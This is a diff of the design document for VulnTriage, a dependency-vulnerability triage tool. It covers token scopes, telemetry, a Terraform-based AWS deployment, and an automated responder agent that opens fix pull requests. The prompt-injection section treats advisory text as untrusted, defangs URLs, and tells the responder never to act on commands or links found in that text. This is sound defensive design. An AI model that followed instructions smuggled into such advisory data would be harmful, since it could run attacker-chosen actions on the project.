+| Tracker token (showcase: n8n; not built for submission) | Create, comment on and close issues in `vuln-triage-findings` | Push code, change settings, touch other repositories | GitHub fine-grained token: `issues: read/write` on that repository only (VERIFY, spec US-8) | A `git push` to `vuln-triage-findings` with it is refused |
+| n8n API token (showcase; not built for submission) | List, claim and report jobs; start refresh and re-scan; fetch the weekly digest | Set any finding status, including `risk accepted`; edit assets; read users | API authorisation (role `n8n`, endpoint allowlist) | Risk acceptance with it gets 403 and no state change |
+| MCP API token (showcase: US-12 and the MCP server; not built for submission) | GET the read endpoints the four tools use | Any write | API authorisation (role `mcp-read`, GET only) | `POST` to the assets endpoint, or risk acceptance on a finding, gets 403 `forbidden` and no state change (US-12) |
 | Responder GitHub token or App (D2) | Push branches and open pull requests on the application repository | Push to `main`, merge, change settings, touch other repositories; no AWS credential at all | Fine-grained token or App: contents write and pull requests write on that repository only; branch protection on `main` requiring a pull request and the human's review, with no bypass (VERIFY: fine-grained tokens can't be limited to a branch, so branch protection is the enforcement) | `git push origin HEAD:main` with it is rejected |
 | Responder API and Grafana tokens | GET findings and jobs through the API; read logs and dashboards from Loki and Grafana with the Viewer token | Any API write; editing dashboards or alert rules | API authorisation (role `responder-read`, GET only); Grafana Viewer role (VERIFY) | `POST /notification-jobs/{id}/claim` with it gets 403 and the job stays `pending` |
-| LLM API keys (one for the backend, one for the responder) | Call the provider's model API | Be used by any other component; exceed the spend limit | Each key only in its holder's secret; provider-side spend limit (VERIFY) | A call past the spend limit is refused by the provider (VERIFY); the backend then takes the "brief unavailable" path |
-| CI deploy credentials (GitHub OIDC to two IAM roles) | Dev role: push to the VulnTriage ECR repositories and update `vt-dev`. Prod role: update `vt-prod` with an existing image digest | Run from a pull request or another branch; update `vt-prod` with the dev role; delete stacks; manage IAM | IAM role trust policy conditions on repository, branch and GitHub environment (VERIFY: OIDC `sub` claim format); IAM policies scoped to named repositories and stacks; the `production` environment's required reviewer | A pull-request workflow's assume-role call is denied; `DeleteStack` with the dev role is denied |
-| Database credential | Read and write VulnTriage's database | Be used by any component except the backend | Only the backend's environment holds it; the database is on a network only the backend joins (Compose network, AWS security group, VERIFY) | A connection from the n8n container to the database fails |
+| LLM API keys (showcase, X4: the backend's key; the responder's key is local Compose only, as the secrets table above says) | Call the provider's model API | Be used by any other component; exceed the spend limit | Each key only in its holder's secret; provider-side spend limit (VERIFY) | A call past the spend limit is refused by the provider (VERIFY), for the responder's key; showcase: the backend then takes the "brief unavailable" path |
+| CI deploy credentials (GitHub OIDC to two IAM roles, created by Terraform) | Dev role: run the dev deploy on the server (VERIFY: SSM Run Command or equivalent) for the dev Compose project only. Prod role: run the production deploy on the server with an existing image tag. Images are pushed to GHCR with the workflow's `GITHUB_TOKEN`, not an AWS role | Run from a pull request or another branch; run the production deploy with the dev role; change IAM, Terraform state or the server's configuration; read secrets | The roles' trust policies (built in task 17) with conditions on repository, branch and GitHub environment (VERIFY: OIDC `sub` claim format); IAM policies scoped to the one server and the deploy command; the `production` environment's required reviewer | A pull-request workflow's assume-role call is denied; the dev role invoking the production deploy is denied |
+| Database credential | Read and write VulnTriage's database | Be used by any component except the backend | Only the backend's environment holds it; the database is on a network only the backend joins (Compose network, AWS security group, VERIFY) | A connection from any other container (for example the Collector; showcase: n8n) to the database fails |
 | Dashboard session | Act as the signed-in user's role | Work after expiry or logout; work cross-site; accept risk with an empty reason | API authorisation (session lookup and expiry, SameSite cookie, CSRF header, US-11 reason check) | A request with an expired session gets 401; risk acceptance with a whitespace reason gets 422 and no change |
 
 Prompt injection, per flow in the spec's Advisory-derived text table (#9 finding 11):
 
 | Flow | Mechanism |
 |---|---|
-| LLM brief | Prompt structure and guardrail (LLM brief); link built by VulnTriage |
+| LLM brief (showcase, X4; not built for submission) | Prompt structure and guardrail (LLM brief); link built by VulnTriage |
 | Owner notification, US-9 reminder and escalation, weekly digest, E8 "signals changed" notice | `text/plain` email only, labelled fields, advisory text only under "Advisory summary (untrusted, from OSV):"; URLs in advisory text are defanged (`https://` becomes `hxxps[:]//`) so mail clients don't link them |
 | US-14 alert payload | The alert's labels and template carry finding id and tier only; no advisory field exists in the metric, so none can leak |
 | Responder reading the API | Its instructions say API advisory text is untrusted data; it never runs commands, opens URLs or uses paths taken from advisory text; its credentials can't push to `main` or touch AWS |
@@ -337,15 +345,15 @@ ASSUMPTION: (A31) the defanging form and the `@` mention handling.
 
 ## Observability
 
-The US-13 journey is scan → match → score → notification job → n8n delivery → delivery report.
+The US-13 journey is scan → match → score → notification job → backend delivery (`notification.enqueue`, then `notification.deliver`, both backend spans) → delivery outcome. Showcase: with n8n the delivery step is n8n's and the outcome is its delivery report.
 
 | Signal | What |
 |---|---|
-| Trace | Root span `scan.run`, children `repository.read`, `osv.query`, `signals.enrich`, `prioritise`, `brief.generate`, `notification.enqueue`, and later `notification.deliver` |
+| Trace | Root span `scan.run`, children `repository.read`, `osv.query`, `signals.enrich`, `prioritise`, `brief.generate` (showcase), `notification.enqueue`, and later `notification.deliver` |
 | Metric | `vt_notifications_total{kind,outcome}`, `vt_notification_delivery_seconds`, `vt_top_tier_notification_overdue{finding_id,tier}` (0 or 1) |
 | Log | JSON lines: `event`, `trace_id`, `span_id`, ids and outcome codes only |
 
-One trace ID: the backend stores the W3C `traceparent` of `notification.enqueue` on the NotificationJob. n8n receives it in the job and sends it back as the `traceparent` header when it reports the result (VERIFY: n8n's HTTP Request node sets custom headers). The backend records `notification.deliver` as a child span and logs and counts the outcome with the same trace ID, so the journey joins in the backend even if n8n emits no spans. Grafana shows the metric, trace and logs side by side, with trace-to-logs links (VERIFY: Tempo-to-Loki data source link). Every code path that creates a NotificationJob (a scan, the daily signal refresh, the reminder and escalation schedules, issue close, the weekly digest) records a `notification.enqueue` span, with its own root span when it is not inside `scan.run`, and stores that span's `traceparent` on the job. A job's `traceparent` is therefore never null and never changes.
+One trace ID: the backend stores the W3C `traceparent` of `notification.enqueue` on the NotificationJob. For submission the backend delivery worker reads it from the job, records `notification.deliver` as a child span of it, and logs and counts the outcome with the same trace ID, so the whole journey is in the backend. Showcase: n8n receives the `traceparent` in the job and sends it back as the `traceparent` header when it reports the result (VERIFY: n8n's HTTP Request node sets custom headers), so the journey joins in the backend even if n8n emits no spans. Grafana shows the metric, trace and logs side by side, with trace-to-logs links (VERIFY: Tempo-to-Loki data source link). Every code path that creates a NotificationJob (a scan, the daily signal refresh; showcase: the reminder and escalation schedules, issue close, the weekly digest) records a `notification.enqueue` span, with its own root span when it is not inside `scan.run`, and stores that span's `traceparent` on the job. A job's `traceparent` is therefore never null and never changes.
 
 Telemetry exclusions (US-13: advisory text, owner contact details, repository URLs, lockfile content, credentials):
 - In code: spans and logs are written through one helper that accepts only allowlisted attribute keys, and log bodies are event names only.
@@ -369,64 +377,65 @@ ASSUMPTION: (A33) W and the evaluation interval (no repeat notification is the h
 | Item | Design |
 |---|---|
 | What wakes it | The US-14 alert, through Grafana's webhook contact point, authenticated with a bearer secret (VERIFY: Grafana webhook authorization header). The receiver ignores repeats of an alert fingerprint it has already handled. |
-| Where it runs | A container in the observability stack: a small webhook receiver that starts one agent run per alert in a fresh checkout. Agent runtime: for example the Claude Agent SDK, model pinned in configuration (dependency, ask before adding; VERIFY). `RESPONDER_MODE=stub` for tests. It does not depend on cloud sessions. |
+| Where it runs | For submission, a container in the local Compose observability stack (decision H6); running it on AWS is showcase item X3. A small webhook receiver that starts one agent run per alert in a fresh checkout. Agent runtime: for example the Claude Agent SDK, model pinned in configuration (dependency, ask before adding; VERIFY). `RESPONDER_MODE=stub` for tests. It does not depend on cloud sessions. |
 | What it does | Reads the finding and job state through the API and the trace's logs from Loki; writes a failing test that reproduces the defect; fixes the code; pushes the branch `responder/<alert fingerprint>`; opens a pull request with the fix, the test and the alert link. Every action is logged to Loki as a structured event, without secrets or advisory text. |
-| What it may change | Application code and tests in a pull request. Not `main`, not infrastructure stacks, not data, not the tracker repository, not live n8n workflows (only their exported JSON, in a pull request). |
+| What it may change | Application code and tests in a pull request. Not `main`, not infrastructure stacks, not data, not the tracker repository (showcase: not live n8n workflows, only their exported JSON, in a pull request). |
 | Credential scope (D2, spec Open question 5) | Fine-grained token or GitHub App on the application repository only, with contents write and pull requests write; `main` protected (pull request and the human's review required), so a push to `main` is refused; the human merges; no AWS credential; read-only API and Grafana/Loki tokens (Security boundaries). |
-| After the merge | CI deploys to dev; n8n's next poll retries the failed job, which now succeeds; the metric returns to 0 and the alert resolves. Production promotion stays manual. |
+| After the merge | CI deploys to dev (in the local run, the human restarts the local stack on the merged code); the backend's next delivery attempt retries the failed job (showcase: n8n's next poll), which now succeeds; the metric returns to 0 and the alert resolves. Production promotion stays manual. |
 | Demo defect | The owner-notification formatter fails for a finding with no fixed version (US-15's example), so its job fails. It is switched on by the dev-only setting `VT_DEMO_DEFECT=notify_no_fix`, which routes formatting through the deliberately broken code path, and off by unsetting it; the backend refuses to start in production with it set. Detail in Stage 4. |
 
-ASSUMPTION: (A34) the responder's placement, branch name and the retry of failed jobs on each poll (up to 7 days). ASSUMPTION: (A35) the demo-defect switch.
+ASSUMPTION: (A34) the responder runs in local Compose for submission (AWS only as showcase item X3, `_docs/roadmap-showcase.md`), with a recorded alert-to-fix run as the evidence; its branch name; and the retry of failed jobs on each delivery attempt (up to 7 days). ASSUMPTION: (A35) the demo-defect switch.
 
 ## Deployment
 
-Human decision of 2026-10-17 ([#9 comment 6229681999](https://github.com/andrew-chung-au/vuln-triage/issues/9#issuecomment-6229681999)): "host on AWS with CloudFormation, following the Module 3/4 pattern (ECR images, dev and prod copies, a separate observability stack with Grafana behind authentication). Instance sizing and cost controls to be designed in Stage 2." VERIFY: the "Module 3/4 pattern" details the human referred to (Open question 6).
+Human decisions: 2026-10-17 ([#9 comment 6229681999](https://github.com/andrew-chung-au/vuln-triage/issues/9#issuecomment-6229681999)) chose AWS hosting following the Module 3/4 pattern, with sizing and cost controls designed in Stage 2. Superseded in part on 2026-10-22 by H2-H6 (recorded in `_docs/roadmap.md`): infrastructure as code with Terraform instead of the earlier CloudFormation choice, one server for dev and prod, images in GHCR instead of the earlier ECR choice, `sslip.io` hostnames, and observability, the alert and the responder in local Compose for submission. The Module 3/4 pattern is kept as adapted by H2-H4 (Open question 6).
 
-| CloudFormation stack | Contents |
+Tool: Terraform. OpenTofu runs the same files; nothing here depends on which of the two the human installs. Terraform itself is a tool the build task asks for before it is installed. VERIFY: Terraform's current licence terms and the version the AWS provider needs.
+
+| Terraform module | Contents |
 |---|---|
-| `vt-ci-iam` | GitHub OIDC provider and the dev and prod deploy roles |
-| `vt-ecr` | ECR repositories for backend, frontend and responder images, with a lifecycle rule keeping the last 10 images (VERIFY) |
-| `vt-observability` | One instance running Prometheus, Loki, Tempo, Grafana (login required, anonymous access off) and the responder |
-| `vt-dev` | One instance running the app's Compose services: frontend, backend, Postgres on an EBS volume, n8n, Collector, behind a TLS reverse proxy |
-| `vt-prod` | Same template as `vt-dev`, separate parameters and secrets |
+| State bucket | One S3 bucket for Terraform state (versioned, private, encrypted). Created by hand-run bootstrap Terraform with local state, by the human. VERIFY: S3-native state locking (no DynamoDB table) is available in the Terraform version used; if not, a lock table is added |
+| Deploy role | The GitHub OIDC provider (or a reference to the account's existing one) and the dev and prod deploy roles with their trust policies (Security boundaries). Applied by the human, never by CI |
+| Server | One EC2 instance with an Elastic IP, security group (80 and 443 open; no SSH, access through Session Manager; VERIFY), instance role, EBS data volume with daily snapshots, the nightly stop schedule, and a bootstrap that installs Docker and the Compose projects. Tagged `project=vuln-triage` |
 
-ASSUMPTION: (A36) compute shape: one EC2 instance per environment running Docker Compose, `t3.small` for dev and prod and `t3.medium` for observability, Postgres in a container on EBS with daily snapshots for prod; the public URL needs a domain name from the human (Open question 7). VERIFY: instance types, prices, the snapshot mechanism and how an instance pulls a new image digest on stack update.
+Nothing else is created: no container registry (GHCR holds the images), no load balancer, NAT gateway or managed database, and no separate observability server (local Compose for submission; `vt-observability` as an AWS server is showcase item X3 in `_docs/roadmap-showcase.md`).
+
+ASSUMPTION: (A36) one server runs both environments as two Docker Compose projects, `dev` and `prod`, behind one reverse proxy on two hostnames. The server is one `t3.medium` class instance (VERIFY: size, price and whether both projects fit in memory; `t3.small` is the fallback only if the two projects fit). Postgres runs in a container per project on the EBS volume, with daily snapshots for the prod data. Hostnames come from the server's Elastic IP through `sslip.io`, for example `dev.203-0-113-10.sslip.io` and `app.203-0-113-10.sslip.io` (VERIFY: sslip.io resolves a name with any prefix to the embedded IP), with HTTPS from Let's Encrypt, obtained by the reverse proxy (VERIFY: Let's Encrypt rate limits for certificates under the shared `sslip.io` name, which are shared with every other sslip.io user, and whether it is on the public suffix list). The Elastic IP is kept so the hostnames survive the nightly stop; if it is released, the hostnames change. No domain is bought (Open question 7).
 
 Pipeline (GitHub Actions):
-1. Every pull request and review branch: unit tests, integration tests, image builds, Compose integration tests.
-2. Push to `main`: build once, tag with the commit SHA, push to ECR, record each image digest; update `vt-dev` with those digests.
-3. Production: a manual workflow run in the `production` environment (the human is the required reviewer; VERIFY: GitHub environment protection rules on this repository's plan) takes a digest (default: the one running in dev) and updates `vt-prod` with that same digest. Nothing is rebuilt.
+1. Every pull request and review branch: unit tests, integration tests, image builds, Compose integration tests. Pull-request workflows never receive an AWS role.
+2. Push to `main`, when tests pass: build once, tag with the course image tag `YYYYMMDD-HHMMSS-shortsha` (roadmap D2), push to GHCR, record each image digest in the deploy log; then deploy by image tag on the server, for the `dev` project only. The deploy mechanism is the workflow assuming the dev role and running the deploy on the server (VERIFY: SSM Run Command or an equivalent), where it pulls the tagged images and restarts the `dev` Compose project.
+3. Production: a manual workflow run in the `production` environment (the human is the required reviewer; VERIFY: GitHub environment protection rules on this repository's plan) takes an image tag (default: the one running in dev) and runs the production deploy on the server for the `prod` project with that same tag. Nothing is rebuilt.
 
-Rollback: run the production promotion again with the previous digest, recorded in the stack's parameters and the deploy log. Database migrations (Alembic, dependency, ask before adding) are backward compatible for one release: add columns and tables first, remove them only in a later release, so the previous image runs on the new schema. A failed stack update is rolled back by CloudFormation (VERIFY).
+Rollback: run the production deploy again with the previous image tag, taken from the deploy log, which also holds the digest of every tag. A deploy that fails to pull leaves the running containers in place (VERIFY). Database migrations (Alembic, dependency, ask before adding) are backward compatible for one release: add columns and tables first, remove them only in a later release, so the previous image runs on the new schema.
 
 Cost controls:
-- Small instances (above); no load balancer, NAT gateway or managed database (VERIFY: their prices are the reason).
+- One server; no load balancer, NAT gateway, managed database or registry charge (VERIFY: their prices are the reason).
 - An AWS Budgets monthly budget with email alerts at 50 %, 80 % and 100 % (VERIFY: Budgets pricing).
-- Dev and observability instances stopped every night by a scheduled rule and started by the human for work or a demo (VERIFY: EventBridge Scheduler or Instance Scheduler).
-- ECR lifecycle rule; Prometheus, Loki and Tempo retention of 7 days.
-- ASSUMPTION: (A37) the budget amount (set by the human), the nightly stop and the retention period.
+- The server is stopped every night by a scheduled rule and started by the human for work or a demo (VERIFY: EventBridge Scheduler or Instance Scheduler). While stopped, the EBS volumes, snapshots and the Elastic IP address are still charged (VERIFY: amounts); after teardown the standing cost is about $0, apart from the state bucket's few cents (VERIFY).
+- Prometheus, Loki and Tempo retention of 7 days (local Compose).
+- ASSUMPTION: (A37) the budget amount (set by the human), the nightly stop of the server and the retention period.
 
 Teardown (deletes cloud resources, so the human runs it; in this order):
 1. Export anything to keep (a prod database dump).
-2. Delete `vt-prod`, then `vt-dev`, then `vt-observability`.
-3. Delete every image in the ECR repositories, then delete `vt-ecr` (VERIFY: a stack can't delete a non-empty repository).
-4. Delete `vt-ci-iam`.
-5. Delete the EBS snapshots, the Secrets Manager secrets without a recovery window (VERIFY) and the budget.
-6. Check that no resource tagged `project=vuln-triage` remains (VERIFY: Tag Editor or Resource Groups search) and that the next bill shows no running charges.
+2. Run `terraform destroy` for the server module, then the deploy role module (VERIFY: destroy order and that the Elastic IP is released).
+3. Delete the EBS snapshots, the Secrets Manager secrets without a recovery window (VERIFY) and the budget. The GHCR images are deleted in the GitHub package settings if wanted.
+4. Last, empty and delete the state bucket (VERIFY: a versioned bucket needs all versions removed).
+5. Check that no resource tagged `project=vuln-triage` remains (VERIFY: Tag Editor or Resource Groups search) and that the next bill shows no running charges.
 
-All AWS service names, behaviours and prices above carry `VERIFY:` until checked against AWS documentation at build time.
+All AWS, GHCR, Let's Encrypt and Terraform service names, behaviours and prices above carry `VERIFY:` until checked against their documentation at build time.
 
 ## Development environment
 
-Environment (D1, human decision of 2026-10-20): a Compose-based dev container recipe. Postgres, and later n8n, the Collector, Prometheus, Loki, Tempo, Grafana and a mail catcher, run as service containers beside the dev container; agents reach them by service name but can't control Docker, build images or run `docker compose`. Setting it up is #31 (roadmap step 16). How the human runs image builds and stack checks for the agents is `_docs/docker-runbook.md`: CI on `check/` review branches by default (route 1), reviewed host runs on request (route 2). `_docs/cloud-sessions.md` is optional; nothing here depends on it.
+Environment (D1, human decision of 2026-10-20): a Compose-based dev container recipe. Postgres, and later the Collector, Prometheus, Loki, Tempo, Grafana and the MailHog mail catcher (showcase: and n8n), run as service containers beside the dev container; agents reach them by service name but can't control Docker, build images or run `docker compose`. Setting it up is #31 (roadmap step 16). How the human runs image builds and stack checks for the agents is `_docs/docker-runbook.md`: CI on `check/` review branches by default (route 1), reviewed host runs on request (route 2). `_docs/cloud-sessions.md` is optional; nothing here depends on it.
 
 | Check | Where it runs |
 |---|---|
-| Backend unit tests (parser, version ordering, fixed version, tiers and tie-breaks, guardrail, authorisation refused cases), with stubs for OSV, KEV, EPSS, GitHub and the LLM | Locally in the sandbox, no Docker, SQLite in memory |
+| Backend unit tests (parser, version ordering, fixed version, tiers and tie-breaks, guardrail (showcase), authorisation refused cases), with stubs for OSV, KEV, EPSS, GitHub and the LLM (showcase) | Locally in the sandbox, no Docker, SQLite in memory |
 | Backend integration tests (API and database through the app, stubbed externals) | Locally on SQLite (no Docker); against Postgres in the sandbox once #31's service container exists, and in CI |
 | Frontend tests (vitest) and MCP server tests against a stub API | Locally, no Docker |
-| Image builds, `docker compose up` of the full stack, Compose integration tests (n8n workflows end to end, Collector allowlist, alert rule) | CI only (route 1), or the human on the host (route 2) |
-| CloudFormation template checks (for example `cfn-lint`, dependency, ask before adding) and deploys | CI only |
+| Image builds, `docker compose up` of the full stack, Compose integration tests (delivery to MailHog, Collector allowlist, alert rule; showcase: n8n workflows end to end) | CI only (route 1), or the human on the host (route 2) |
+| Terraform checks (`terraform fmt -check` and `terraform validate`; a linter such as `tflint` would be a dependency, ask before adding) and deploys | CI only |
 
 Tier A needs only the "locally" rows, so it doesn't wait for #31.
 
@@ -438,14 +447,14 @@ Pilot assets (#9 finding 15): the pilot asset list is defined in Stage 5 (`_docs
 |---|---|---|---|
 | Application | Components, Workflow, Data model | React frontend, FastAPI backend, SQLite (Postgres in Compose); one start command (Stage 5) | A |
 | Testing | Development environment | Unit and integration tests on SQLite with stubs, one test command | A |
-| Containerization | Development environment, Deployment | Compose file with frontend, backend, Postgres, n8n, Collector; one command | B |
-| Deployment | Deployment | `vt-dev` and `vt-prod` on AWS with a public URL | B |
-| CI/CD | Deployment | GitHub Actions: tests on every pull request, auto-deploy to dev, manual promotion of the same digest to production | B |
+| Containerization | Development environment, Deployment | Compose file with frontend, backend, Postgres, Collector; one command (n8n is a showcase item) | B |
+| Deployment | Deployment | One Terraform-built AWS server running the dev and prod Compose projects, with public `sslip.io` HTTPS URLs | B |
+| CI/CD | Deployment | GitHub Actions: tests on every pull request, auto-deploy to dev, manual promotion of the same image tag to production | B |
 | Observability | Observability | Collector, Prometheus, Loki, Tempo, Grafana; the US-13 journey with one trace ID and the exclusions | C |
 | Alerting on User Impact | Observability (US-14 rule) | Grafana alerting on `vt_top_tier_notification_overdue` | C |
 | On-Call Agent | Responder agent | Responder container, Grafana webhook, the demo defect | C |
 
-Tier A uses no Tier B or C component: it runs on SQLite with no Docker, n8n, Collector or AWS.
+Tier A uses no Tier B or C component: it runs on SQLite with no Docker, Collector or AWS (and no n8n, which is showcase).
 
 ## Open questions
 
@@ -454,19 +463,19 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, n8n, Col
 3. Spec Open question 3 (channel): email, (A26).
 4. Spec Open question 4 (US-14 window): 30 minutes, (A33).
 5. Spec Open question 5 (responder credential and merge): answered by D2 (Responder agent).
-6. What exactly is the "Module 3/4 pattern"? It decides whether (A36)'s one-instance-per-environment shape is right or should be ECS.
-7. Which domain name and TLS approach does the public URL use?
+6. Closed: the "Module 3/4 pattern" is followed as adapted by H2-H4 (Terraform, one server for both environments, GHCR); see Deployment and (A36). VERIFY: what the pattern prescribes beyond that stays unconfirmed, as it does not change the shape.
+7. Closed: no domain; hostnames come from `sslip.io` (H5) with Let's Encrypt HTTPS (Deployment, (A36)). VERIFY: Let's Encrypt rate limits for `sslip.io` names.
 8. The EPSS threshold T = 0.10 (A18) and the "exposed asset" definition (A17): confirm.
-9. Which LLM provider and model (A23)?
+9. (Showcase, X4) Which LLM provider and model (A23)? Candidate provider (not decided): the Gemini free tier, which could serve the responder's local key and the future brief; VERIFY: free-tier rate limits, whether free-tier data may be used for model improvement (the responder reads application code and logs), current model names, and that its SDK is a dependency (ask before adding).
 10. An exploited vulnerability with no CVE can never reach `P1` or `P2` under these rules (E11 has no KEV or EPSS). Accept, or add a rule?
 11. Does Juice Shop commit a supported lockfile (A41)?
 
 ## Assumptions
 
-- (A1) Component tiers: Postgres and n8n are Tier B; the MCP server is Tier A.
-- (A2) n8n and Grafana keep their state in their default embedded stores on their own volumes.
-- (A3) Re-scans run on a daily n8n schedule after the refresh and on a person's demand; registration starts the first scan.
-- (A4) Scans and briefs run as background jobs in the backend with a job table and one worker.
+- (A1) Component tiers: Postgres is Tier B (n8n too, showcase); the MCP server is Tier A.
+- (A2) Grafana keeps its state in its default embedded store on its own volume (showcase: n8n too).
+- (A3) Re-scans run on a daily schedule after the refresh (backend scheduler for submission; n8n in the showcase) and on a person's demand; registration starts the first scan.
+- (A4) Scans and briefs (showcase: the briefs) run as background jobs in the backend with a job table and one worker.
 - (A5) Lockfiles are looked for at the repository root only.
 - (A6) One finding per package across several files; highest per-entry fixed version; `fixed` only when every entry is clear.
 - (A8) The `uv.lock` and `package-lock.json` entry handling, including lockfileVersion 1 as a parse error.
@@ -481,11 +490,11 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, n8n, Col
 - (A19) "Oldest finding" uses first detection time; the final tie-break is finding id.
 - (A20) Tiers cover `open` and `risk accepted`; the ranked list is `open` only; E8 escalation means a tier rise or becoming `KEV: listed`.
 - (A21) An email-only owner is notified; a name-only owner's notification is held.
-- (A22) The brief prompt includes the advisory summary, truncated to 500 characters.
-- (A23) LLM provider chosen with the human; 20 s timeout; briefs cached per lifecycle, fixed version, prompt version and model.
-- (A24) The brief output check rejects other version tokens and any URL in text fields.
-- (A25) n8n poll every 5 minutes; refresh 06:00 UTC; digest Monday 08:00 UTC.
-- (A26) Email over SMTP; a mail catcher in development and Amazon SES in AWS.
+- (A22, showcase) The brief prompt includes the advisory summary, truncated to 500 characters.
+- (A23, showcase) LLM provider chosen with the human; 20 s timeout; briefs cached per lifecycle, fixed version, prompt version and model.
+- (A24, showcase) The brief output check rejects other version tokens and any URL in text fields.
+- (A25, showcase: n8n) n8n poll every 5 minutes; refresh 06:00 UTC; digest Monday 08:00 UTC.
+- (A26) Email sent by the backend: MailHog in development and tests, the Amazon SES API with the instance role from one verified sender in AWS.
 - (A27) US-9 windows `P1` 7, `P2` 14, `P3` 30, `P4` 90 days; reminders and escalation at due and weekly after.
 - (A28) A missing security-lead contact shows on `/health` and a dashboard banner, and holds escalation and digest jobs.
 - (A29) The MCP server runs over stdio on the developer's machine; `get_asset` includes owner contact.
@@ -493,10 +502,10 @@ Tier A uses no Tier B or C component: it runs on SQLite with no Docker, n8n, Col
 - (A31) URL defanging and `@` mention handling in emails and issue bodies.
 - (A32) The telemetry attribute allowlist.
 - (A33) US-14 window 30 minutes, 1-minute evaluation.
-- (A34) The responder runs as a container in the observability stack; branch `responder/<fingerprint>`; failed jobs are retried each poll for up to 7 days.
+- (A34) The responder runs as a container in local Compose for submission (AWS only as showcase item X3); branch `responder/<fingerprint>`; failed jobs are retried each poll for up to 7 days.
 - (A35) The demo defect is switched by `VT_DEMO_DEFECT`, refused in production.
-- (A36) One EC2 instance per environment running Compose; `t3.small` / `t3.medium`; Postgres in a container on EBS.
-- (A37) Budget amount set by the human; nightly stop of dev and observability; 7-day telemetry retention.
+- (A36) One EC2 server runs dev and prod as two Compose projects behind two `sslip.io` hostnames; Postgres in a container on EBS.
+- (A37) Budget amount set by the human; nightly stop of the server; 7-day telemetry retention.
 - (A38) The pilot seed list is a data file in the repository, registered through the API.
 - (A39) Held notification jobs never fire the US-14 alert.
 - (A40) Instrumentation is a no-op without a Collector endpoint.
